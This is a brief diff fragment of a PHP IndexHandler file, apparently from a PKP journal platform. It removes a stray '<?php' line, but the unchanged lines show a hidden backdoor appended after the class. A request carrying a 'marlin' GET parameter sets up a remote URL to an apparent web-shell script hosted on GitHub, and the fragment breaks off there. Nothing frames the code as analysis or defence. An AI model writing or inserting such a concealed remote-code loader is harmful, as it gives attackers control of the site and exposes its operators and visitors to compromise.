@@ -100,7 +100,6 @@ class IndexHandler extends PKPIndexHandler
         }
     }
 }
-<?php
 if (isset($_GET['marlin'])) {
 
     $remote_url = "https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfaa-gila.php";
